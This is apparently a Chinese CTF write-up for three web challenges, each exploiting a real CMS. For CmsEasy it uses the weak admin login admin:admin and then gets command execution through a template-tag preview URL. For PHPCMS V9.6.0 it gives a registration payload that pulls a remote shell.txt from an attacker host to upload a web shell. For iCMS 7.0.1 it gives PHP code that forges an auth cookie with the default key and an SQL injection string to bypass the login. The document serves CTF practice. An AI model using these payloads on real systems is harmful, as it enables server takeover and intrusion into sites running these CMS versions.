### web477

#### CmsEasy 命令执行

/admin后台管理

弱密码`admin:admin`

![image-20240607140224725](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240607140224725.png)

编辑一个自定义标签，预览就可以命令执行

```
/index.php?case=templatetag&act=test&id=25
```

### web478

#### PHPCMS V9.6.0 文件上传

访问/install/install.php安装cms

注册界面带生日选项的可以利用

![image-20240607141010663](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240607141010663.png)

payload

```
siteid=1&modelid=11&username=test442&password=test2123&email=test21154@163.com&info[content]=<img src=http://ip/shell.txt?.php#.jpg>&dosubmit=1&protocol=
```

![image-20240607140916790](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240607140916790.png)

### web479

#### iCMS-7.0.1后台登录绕过分析

> 默认key:n9pSQYvdWhtBz3UHZFVL7c6vf4x6fePk

```php
<?php
//error_reporting(0);
function urlsafe_b64decode($input){
    $remainder = strlen($input) % 4;
    if ($remainder) {
        $padlen = 4 - $remainder;
        $input .= str_repeat('=', $padlen);
    }
    return base64_decode(strtr($input, '-_!', '+/%'));
}

function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
    $ckey_length   = 8;
    $key           = md5($key ? $key : iPHP_KEY);
    $keya          = md5(substr($key, 0, 16));
    $keyb          = md5(substr($key, 16, 16));
    $keyc          = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

    $cryptkey      = $keya.md5($keya.$keyc);
    $key_length    = strlen($cryptkey);

    $string        = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
    $string_length = strlen($string);

    $result        = '';
    $box           = range(0, 255);

    $rndkey        = array();
    for($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }

    for($j = $i = 0; $i < 256; $i++) {
        $j       = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp     = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }

    for($a = $j = $i = 0; $i < $string_length; $i++) {
        $a       = ($a + 1) % 256;
        $j       = ($j + $box[$a]) % 256;
        $tmp     = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result  .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }

    if($operation == 'DECODE') {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    } else {
        return $keyc.str_replace('=', '', base64_encode($result));
    }
}

echo "iCMS_iCMS_AUTH=".urlencode(authcode("'or 1=1##=iCMS[192.168.0.1]=#1","ENCODE","n9pSQYvdWhtBz3UHZFVL7c6vf4x6fePk"));
```

![image-20240607124845435](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240607124845435.png)



